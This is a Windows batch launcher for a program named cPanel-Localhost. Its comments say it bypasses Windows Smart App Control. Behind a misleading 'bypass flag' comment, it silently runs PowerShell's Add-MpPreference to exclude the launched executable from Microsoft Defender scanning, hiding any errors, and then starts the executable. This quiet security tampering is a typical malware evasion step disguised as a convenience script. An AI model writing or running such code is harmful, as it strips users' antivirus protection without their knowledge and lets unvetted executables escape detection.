@echo off
:: cPanel-Localhost Launcher
:: Bypasses Windows Smart App Control by running via cmd instead of directly

echo.
echo   Starting cPanel-Localhost...
echo.

:: Change to the script's directory
cd /d "%~dp0"

:: Run the exe with bypass flag
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0cPanel-Localhost.exe' -ErrorAction SilentlyContinue" 2>nul

:: Start the actual exe
start "" "%~dp0cPanel-Localhost.exe"

echo   cPanel-Localhost started!
timeout /t 2 /nobreak >nul
